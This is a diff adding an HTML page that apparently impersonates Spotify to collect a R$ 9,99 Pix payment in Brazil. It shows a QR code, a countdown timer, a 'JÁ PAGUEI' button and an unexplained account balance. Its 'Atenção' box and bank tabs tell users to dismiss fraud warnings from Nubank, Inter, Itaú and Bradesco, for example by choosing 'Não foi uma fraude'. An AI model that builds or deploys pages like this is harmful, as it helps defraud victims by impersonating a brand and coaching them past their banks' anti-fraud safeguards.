@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagamento Pix | Spotify</title>
+
+    <!-- FONT GOOGLE POPPINS -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="css/pix.css">
+    
+    <!-- CONFIG.JS - Configurações Centralizadas -->
+    <script src="js/config.js"></script>
+</head>
+<body>
+    <!-- TOPO FIXO -->
+    <div id="topoFixo">
+        <img src="images/logo.png" id="logo" alt="Spotify">
+        <div id="saldoatual">
+            Saldo: R$ 382,76
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="card">
+            <!-- LOGO -->
+            <img src="images/logowhite.png" id="logocentral" alt="Spotify">
+
+            <!-- TÍTULO -->
+            <h1 id="titulo">Pague com Pix</h1>
+            <p id="subtitulo">Escaneie o QR Code ou copie o código</p>
+
+            <!-- VALOR -->
+            <div class="valor-box">
+                <span class="label">Valor a pagar</span>
+                <span class="valor" id="valorPix">R$ 9,99</span>
+            </div>
+
+            <!-- QR CODE -->
+            <div class="qrcode-container">
+                <div id="qrcode"></div>
+            </div>
+
+            <!-- CÓPIA E COLA -->
+            <div class="copia-cola">
+                <p class="instrucao">Ou copie o código Pix:</p>
+                <div class="codigo-container">
+                    <input type="text" id="codigoPix" readonly>
+                    <button id="btnCopiar" onclick="copiarCodigo()">
+                        <span class="btn-copiar-text">COPIAR</span>
+                        <span class="btn-copiar-success" style="display:none;">COPIADO! ✓</span>
+                    </button>
+                </div>
+            </div>
+
+            <!-- TIMER -->
+            <div class="timer-container">
+                <span class="timer-label">Expira em:</span>
+                <span id="timer" class="timer-value">23:59:59</span>
+            </div>
+
+            <!-- STATUS -->
+            <div class="status-container">
+                <div class="status-indicator">
+                    <span class="status-dot pulse"></span>
+                    <span class="status-text">Aguardando pagamento...</span>
+                </div>
+                <p class="status-info">O pagamento será confirmado automaticamente</p>
+            </div>
+
+            <!-- INSTRUÇÕES -->
+            <div class="instrucoes">
+                <h3>Como pagar:</h3>
+                <ol>
+                    <li>Abra o app do seu banco</li>
+                    <li>Escolha pagar com Pix</li>
+                    <li>Escaneie o QR Code ou cole o código</li>
+                    <li>Confirme o pagamento</li>
+                </ol>
+            </div>
+
+            <!-- BOTÃO VERIFICAR -->
+            <button id="btnVerificar" onclick="verificarPagamento()">
+                <span class="btn-text">JÁ PAGUEI</span>
+                <span class="btn-loader" style="display: none;">
+                    <i class="spinner"></i> Verificando...
+                </span>
+            </button>
+
+            <!-- Aviso de Segurança PIX -->
+            <div id="pix-notice-container">
+                <div class="pix-notice-alert">
+                    <div class="pix-notice-icon">🛡️</div>
+                    <div>
+                        <strong class="pix-notice-attention">Atenção:</strong>
+                        <span>Os bancos reforçaram a segurança do PIX e podem exibir avisos preventivos. Não se preocupe, sua transação está protegida.</span>
+                    </div>
+                </div>
+
+                <details class="pix-notice-details">
+                    <summary class="pix-notice-summary">
+                        <span>Saiba Mais</span>
+                        <span class="chevron">▼</span>
+                    </summary>
+                    
+                    <div class="pix-notice-content">
+                        
+                        <!-- Abas dos Bancos -->
+                        <div class="bank-tabs" role="tablist" aria-label="Bancos disponíveis">
+                            <button role="tab" aria-selected="true" aria-controls="nubank-panel" id="nubank-tab" class="bank-tab active">
+                                Nubank
+                            </button>
+                            <button role="tab" aria-selected="false" aria-controls="inter-panel" id="inter-tab" class="bank-tab">
+                                Inter
+                            </button>
+                            <button role="tab" aria-selected="false" aria-controls="itau-panel" id="itau-tab" class="bank-tab">
+                                Itaú
+                            </button>
+                            <button role="tab" aria-selected="false" aria-controls="bradesco-panel" id="bradesco-tab" class="bank-tab">
+                                Bradesco
+                            </button>
+                        </div>
+
+                        <!-- Conteúdo das Abas -->
+                        <div class="bank-panels">
+                            
+                            <!-- Nubank -->
+                            <div role="tabpanel" aria-labelledby="nubank-tab" id="nubank-panel" class="bank-panel active">
+                                <div class="panel-content">
+                                    <img src="images/nubank-mobile.webp" alt="Tela do aplicativo Nubank mostrando alerta de segurança" class="bank-image" loading="lazy">
+                                    <p>Se exibido no app, clique na opção <strong>"Não foi uma fraude"</strong> ou similar para finalizar sua compra com segurança.</p>
+                                </div>
+                            </div>
+
+                            <!-- Inter -->
+                            <div role="tabpanel" aria-labelledby="inter-tab" id="inter-panel" class="bank-panel">
+                                <div class="panel-content">
+                                    <img src="images/inter-mobile.webp" alt="Tela do aplicativo Inter mostrando alerta de segurança" class="bank-image" loading="lazy">
+                                    <p>O Inter pode mostrar um alerta. Confirme a transação para continuar com o pagamento do seu pedido.</p>
+                                </div>
+                            </div>
+
+                            <!-- Itaú -->
+                            <div role="tabpanel" aria-labelledby="itau-tab" id="itau-panel" class="bank-panel">
+                                <div class="panel-content">
+                                    <img src="images/itau-mobile.webp" alt="Tela do aplicativo Itaú mostrando alerta de segurança" class="bank-image" loading="lazy">
+                                    <p>Caso veja um aviso, o app do Itaú orientará você a confirmar a operação para prosseguir.</p>
+                                </div>
+                            </div>
+
+                            <!-- Bradesco -->
+                            <div role="tabpanel" aria-labelledby="bradesco-tab" id="bradesco-panel" class="bank-panel">
+                                <div class="panel-content">
+                                    <img src="images/bradesco-mobile.webp" alt="Tela do aplicativo Bradesco mostrando alerta de segurança" class="bank-image" loading="lazy">
+                                    <p>O Bradesco também possui camadas de segurança. Siga as instruções na tela para autorizar o pagamento.</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </details>
+            </div>
+        </div>
+    </div>
+
+    <!-- POPUP DE SUCESSO -->
+    <div id="popupSucesso" class="popup">
+        <div class="popup-content">
+            <div class="popup-icon sucesso">✓</div>
+            <h3>Pagamento Confirmado!</h3>
+            <p>Seu saldo foi liberado com sucesso.</p>
+            <button onclick="irParaConfirmacao()">Continuar</button>
+        </div>
+    </div>
+
+    <!-- POPUP DE ERRO -->
+    <div id="popupErro" class="popup">
+        <div class="popup-content">
+            <div class="popup-icon erro">⚠️</div>
+            <h3>Pagamento não identificado</h3>
+            <p id="mensagemErro">Ainda não identificamos seu pagamento. Aguarde alguns segundos e tente novamente.</p>
+            <button onclick="fecharPopup()">Tentar novamente</button>
+        </div>
+    </div>
+
+    <!-- QR CODE LIBRARY -->
+    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
+    
+    <script src="js/pix.js"></script>
+    
+    <!-- UTMIFY -->
+    <script
+        src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+        data-utmify-prevent-xcod-sck
+        data-utmify-prevent-subids
+        async
+        defer>
+    </script>
+</body>
+</html>
